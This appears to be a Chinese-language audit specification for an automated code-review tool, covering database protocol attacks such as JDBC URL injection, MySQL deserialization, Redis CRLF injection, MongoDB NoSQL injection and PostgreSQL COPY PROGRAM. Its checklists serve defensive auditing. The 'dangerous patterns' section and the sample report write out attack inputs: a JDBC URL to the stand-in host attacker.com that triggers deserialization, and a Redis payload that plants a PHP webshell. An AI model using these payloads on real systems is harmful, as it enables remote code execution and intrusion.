# 数据库协议审计分支

## 触发条件

- 标签: `JDBC_URL`, `MYSQL_DESER`, `POSTGRES_COPY`, `REDIS_PROTO`, `MONGO_NOSQL`, `ELASTICSEARCH_INJECT`
- 优先级: 1（高危）

## 审计检查点

### JDBC URL 攻击

| 检查项 | 说明 |
|--------|------|
| JU1 | JDBC URL 是否来自用户可控输入？ |
| JU2 | 是否限制了 JDBC 驱动类型？ |
| JU3 | MySQL Connector/J 是否禁用 `autoDeserialize=true`？ |
| JU4 | 是否禁用 `allowLoadLocalInfile=true`（MySQL 任意文件读取）？ |
| JU5 | 是否禁用 `allowUrlInLocalInfile=true`？ |
| JU6 | PostgreSQL 是否禁用 `socketFactory` 参数？ |
| JU7 | H2 是否禁用 `INIT=RUNSCRIPT`（RCE）？ |

### MySQL 反序列化

| 检查项 | 说明 |
|--------|------|
| MD1 | MySQL Connector/J 版本是否存在已知反序列化漏洞？ |
| MD2 | 是否配置 `autoDeserialize=false`？ |
| MD3 | 是否配置 `queryInterceptors` 白名单？ |
| MD4 | 是否存在 Fake MySQL Server 攻击风险？ |

### PostgreSQL

| 检查项 | 说明 |
|--------|------|
| PG1 | 是否存在 `COPY` 命令注入（文件读写）？ |
| PG2 | 是否存在 `lo_import` / `lo_export` 文件操作？ |
| PG3 | 是否存在 `COPY ... PROGRAM` 命令执行？ |
| PG4 | 是否存在 Large Object 滥用？ |

### Redis 协议注入

| 检查项 | 说明 |
|--------|------|
| RP1 | Redis 命令是否拼接（而非参数化）？ |
| RP2 | 是否存在 CRLF 注入（`\r\n` 分割命令）？ |
| RP3 | 是否存在 `CONFIG SET` 写入 Webshell？ |
| RP4 | 是否存在 `SLAVEOF` 主从复制 RCE？ |
| RP5 | 是否存在 `MODULE LOAD` 加载恶意模块？ |
| RP6 | Redis 是否启用认证（requirepass）？ |

### MongoDB NoSQL 注入

| 检查项 | 说明 |
|--------|------|
| MN1 | 查询条件是否接受对象类型（`$gt`, `$ne`, `$where`）？ |
| MN2 | 是否存在 `$where` JavaScript 注入？ |
| MN3 | 是否存在 `$regex` ReDoS？ |
| MN4 | 是否存在聚合管道注入？ |
| MN5 | 是否存在 `mapReduce` 代码注入？ |

### Elasticsearch 注入

| 检查项 | 说明 |
|--------|------|
| ES1 | 是否存在 Query DSL 注入（用户输入直接拼接到查询）？ |
| ES2 | 是否存在 Script 注入（Painless/Groovy 脚本执行）？ |
| ES3 | 是否存在 `_search` API 暴露？ |

## 危险模式

```java
// JDBC URL 注入
String jdbcUrl = request.getParameter("dbUrl");
Connection conn = DriverManager.getConnection(jdbcUrl);
// 攻击者输入: jdbc:mysql://attacker.com:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor

// MySQL 反序列化
// MySQL Connector/J < 8.0.28 存在反序列化漏洞
// 需要配置: autoDeserialize=false

// Redis CRLF 注入
String key = request.getParameter("key");
jedis.get(key);
// 攻击者输入: key\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET payload "<?php system($_GET['cmd']); ?>"

// MongoDB NoSQL 注入
DBObject query = (DBObject) JSON.parse(request.getParameter("query"));
collection.find(query);
// 攻击者输入: {"$gt": ""}  // 绕过认证

// PostgreSQL COPY 命令执行
Statement stmt = conn.createStatement();
stmt.execute("COPY (SELECT 'test') TO PROGRAM 'id'");
```

## MySQL Connector/J 恶意参数

| 参数 | 风险 |
|------|------|
| `autoDeserialize=true` | 反序列化 RCE |
| `allowLoadLocalInfile=true` | 任意文件读取 |
| `allowUrlInLocalInfile=true` | URL 文件读取 |
| `queryInterceptors=...` | 拦截器链利用 |
| `connectionAttributes=...` | 属性注入 |
| `serverRSAPublicKeyFile=...` | 文件读取 |

## 审计流程

```
1. 识别项目使用的数据库类型
2. 检查 JDBC URL 构建方式
3. 检查数据库驱动版本
4. 检查是否存在协议级攻击面
5. 检查 NoSQL 查询构建方式
6. 使用 LSP 追踪数据库连接配置
7. 生成漏洞报告或标记为安全
```

## 回溯请求触发条件

- JDBC URL 来自配置中心 → 追踪配置修改权限
- 数据库连接池配置在 XML → 请求读取配置
- NoSQL 查询来自前端 → 追踪查询构建逻辑

## 输出格式

```json
{
  "branch": "db-protocol",
  "database": "MySQL",
  "findings": [
    {
      "type": "JDBC URL 注入 → MySQL 反序列化",
      "severity": "CRITICAL",
      "sink": "DataSourceConfig.java:34",
      "source": "ConfigController.java:22 @RequestParam",
      "evidence": "DriverManager.getConnection(userJdbcUrl)  // 未限制驱动类型和参数",
      "sanitization": "无 URL 白名单，无参数过滤",
      "poc": "jdbcUrl=jdbc:mysql://attacker.com:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
    }
  ]
}
```
